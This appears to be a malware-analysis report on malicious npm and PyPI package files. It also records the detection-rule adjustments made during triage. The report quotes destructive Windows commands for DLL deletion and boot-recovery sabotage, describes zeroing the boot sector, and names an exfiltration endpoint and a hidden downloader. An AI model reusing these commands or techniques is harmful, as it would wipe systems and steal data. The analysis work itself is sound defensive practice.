# Individually reviewed archive members

All six member SHA-256 values and all three archive SHA-256 values match the
queue. Archive convictions were accepted, not re-judged. Analysis used the
original extracted bytes, `atomscan --mode=slow --analyze=local --follow=none
--no-update --format=json`, and `cleave facts --format=json` for each member
and archive. Facts, full scans and comparisons are retained under
`/usr/local/var/cyclotron/tmp.noindex/cyclotron-28a4cdc2/scratch/stranded-members-94cda9-0807ef-a46e55/`.
No specimen was run. The execution paths below were traced from source,
parser-recovered calls and constants, and independently decoded hex strings.

## Verdicts and execution paths

- **parser-session 1.1.9, src/lib/writer.js — MALICIOUS.** Loading the module
  constructs a record spreading the entire process environment and adding the
  package submodule version, OS platform, hostname, username and noninternal
  IPv4-interface MACs. `g` replaces pairs of hex characters with
  `String.fromCharCode(parseInt(pair, 16))`. Its table decodes to `require`,
  `axios`, `post`, `https://log-server-lovat.vercel.app/api/ipcheck/703`,
  `headers`, `x-secret-header`, `secret`, and `then`. Calling the exported
  function loads Axios, posts that record with the static header, and evaluates
  `r.data` from the response; the final catch discards failures. The repeated
  brackets coerce one-element arrays to the same method-name strings. Arguments
  to the exported function are ignored. Concealed bulk environment export and
  response execution are incompatible with the package's advertised HTTP
  response logging function. The endpoint's response and actual deployment are
  unavailable. In this extraction `../package.json` resolves to a missing
  `src/package.json`, preventing direct module initialization; `src/index.js`
  also names an external pnpm/httpreslog writer rather than this local file.
  These limitations prevent a claim that this archive successfully activates
  this member, but do not change the malicious functionality in its bytes.
- **osinthell 1.6.9, v.js — MALICIOUS.** An exported zero-argument function
  synchronously requests `del /F /S /Q C:\\Windows\\System32\\*.dll` through a
  shell, ignores standard streams, and swallows errors. It attempts recursive
  forced deletion of Windows system DLLs. There is no user-selected image,
  maintenance workflow or confirmation in the member. The targeting and
  silent fixed action tip the verdict; elevated access and runtime success
  are not established.
- **osinthell 1.6.9, t.js — MALICIOUS.** Its exported function runs
  `bcdedit /set {default} bootstatuspolicy ignoreallfailures` followed by
  `bcdedit /set {default} recoveryenabled No`, using an ignored-stdio shell and
  an empty catch. If the first command raises, the second is skipped because
  they share a try block. Individual boot-policy commands can be legitimate;
  this fixed, silent, parameterless pair sabotages recovery in a utility
  advertising no boot administration. There is no evidence of actual privileges
  or successful boot configuration changes.
- **osinthell 1.6.9, f.js — MALICIOUS.** Its exported function opens the raw
  `\\.\PhysicalDrive0` device in `r+` mode, allocates 512 zero bytes, writes
  that exact buffer to the same handle at device offset zero, and closes it.
  A separate try block then requests `bootrec /fixmbr` silently, even if the
  raw-disk operation failed. This is destruction of the boot sector, including
  partition information, rather than a disk reader or supplied-image writer.
  The repair command does not establish a legitimate purpose for the preceding
  zero write. Neither raw-device permission nor bootrec availability is proven.
- **osinthell 1.6.9, p.js — MALICIOUS.** Its function enumerates C:, D:, E:
  and F: drive roots, joins each directory entry to that root, tests the same
  path with `statSync(...).isFile()`, and passes it to a two-argument
  `writeFileSync(path, '')`. The default write mode truncates those existing
  files. Nested catches continue through unavailable drives and file errors.
  This is an indiscriminate drive-root file destroyer; it does not recurse
  into subdirectories, securely erase sectors or encrypt files. No caller
  supplies the roots or a cleanup policy.
- **zlibxjson 8.2, zlibxjson/main.py — MALICIOUS.** `init()` reads APPDATA and,
  when present, calls `download_file` with a fixed Discord attachment URL for
  `MinGCC-x64.exe`. The helper creates the destination directory if absent,
  strips URL query parameters from the filename, streams `requests.get`
  response chunks into a binary file, and returns that saved path. `init`
  passes that returned path to `run_silently`, whose Popen uses `shell=True`
  and `subprocess.CREATE_NO_WINDOW`. The supplied wheel binds the
  `zlibxjson_command` console script to `main:init`; importing the package only
  imports the function and does not call it. A purported library with placeholder
  project metadata whose functionality is a fixed hidden executable launcher
  is likely malicious. The member contains no zlib/JSON implementation or
  install/update workflow, integrity verification, or user input selecting a
  program. Actual invocation, operator authorization and the final executable's
  behavior remain unknown. No persistence, credential theft or final payload
  identity is inferred.

`osinthell/package/index.js` requires all lettered modules and calls each,
including these four, from the exported `sorgu(userId)` function; the userId is
unused and the function ultimately calls process.exit(). No lifecycle hook is
needed for that callable path, and module import alone does not call it.

## Findings audited and changes

Every hostile/suspicious finding in these six members was checked against the
source. Writer has five hostile findings for response execution and four
separately bound data sources: environment, host/user identity, interface MACs,
and OS platform. Its four suspicious findings are the corresponding structural
POST chains. These detections are supported and retained. The DLL deletion,
recovery sabotage and boot-sector zeroing each have a hostile detection backed
by a specific silent exported action; the broader suspicious deletion/boot-policy
observations accurately retain their dual-use scope. The root truncator has
its existing hostile truncation and default-empty-write composites plus the
suspicious bound loop. Both Python findings accurately describe the linked
hidden-shell download and its co-occurring Discord executable URL; neither
claims the final payload was maliciously executed.

Two missing **notable** observations were added to existing taxonomy leaves:
`micro-behaviors/fs/disk/raw::node-opensync-physicaldrive-path` matches the
physical-disk path in openSync's first argument, and
`micro-behaviors/os/kernel/boot::node-exec-bootrec-fixmbr` matches a boot repair
command passed to exec/execSync. These are neutral capabilities in both legitimate
and malicious software. Their positive/negative fixtures cover a read-only disk
tool, an ordinary boot repair operation, a disk-image filename, a mere command
mention, a physical-drive string in the wrong argument, echo, and another bootrec
operation. They add coverage to f.js and its archive without changing severity
or replacing the existing boot-sector wipe detection.

The `js-hex-charcode-decoder` description now describes parsed hex values converted
to characters. Its matcher never required hex *escape* syntax, and writer decodes
plain hex pairs. No matcher or coverage was changed for that wording correction.

The shared `js-hex-number-parse` matcher previously accepted numeric 16 in any
parseInt argument. `parseInt(16)` was demonstrated to match despite requesting
no hexadecimal radix. Requiring argument index 1 removes that false positive
while retaining actual `parseInt(value, 16)` decoding. Before changing it, all
YAML consumers were inspected: the direct compact-data-module loader composite,
the `encoding-or-invisible-unicode-indicators` directory selector, and the
`trailing-whitespace-payload` directory selector. The unrelated original
`testdata/hostile/zod-meta.test.mjs` fixture retained all five hostile findings,
including its compact hex/POST/Base64 module loader. The benign compact RPC cache
client retained the correct hex parsing observation and remained nonhostile.
No accurate trait was removed, demoted or suppressed, and no member or archive
lost a finding ID or criticality. The benign decimal control lost only the
unsupported hex conversion finding.

## Coverage limits and classifier disagreements

The small osinthell members each implement one destructive objective. Their
supported capabilities (shell launch, stream suppression, empty catches and
file/device operations) do not independently justify three to five hostile
traits; no additional distinct hostile behavior was found after tracing every
statement. The existing two root-truncation composites are preserved, not added
to fill a quota. No persistence, elevation or network behavior exists in these
four members.

Python retains a **hostile detection gap**: its fixed executable download to
APPDATA and hidden shell launch are fully covered as suspicious behavior, but
there is no attack-specific second stage or independently established malicious
execution mechanism to justify promoting those dual-use primitives. The helper,
return value, saved file and Popen operand were traced, the wheel's CLI trigger
was checked, and payload acquisition was attempted. Forager returned HTTP 404
for the original Discord URL. The mandatory
`forager fetch --all-wheels ... pkg:pypi/zlibxjson@8.2` attempt also failed:
PyPI metadata was unavailable, and its browser fallback lacked ICU data. The
original supplied wheel and member hashes were verified; no reconstruction or
substitute payload was used. Without the final payload or stronger static
attack evidence, a general hostile rule would also convict legitimate hidden
updaters. The malicious judgement uses the complete packaging/functionality
mismatch, rather than treating that judgement itself as matcher evidence.

The model bundle reports feature version 18 while the engine expects 21.
Under the unchanged default classifier, writer and all three archives are
hostile, v.js/t.js/f.js are suspicious, and p.js/main.py are benign, both before
and after the edits. The latter five disagree with the individual source-based
MALICIOUS verdicts. In particular, p.js already has two hostile YAML traits yet
is classifier-benign. No score inflation or inaccurate severity restoration was
used to disguise those disagreements. Parser flow limitations are also recorded
in the scans; source inspection supplied the execution-path analysis.

Counts and exact additions are recorded in `comparison.json` beside this report.
All six individual MALICIOUS markers are written beside their extracted members;
the confirmed archive verdicts are unchanged.
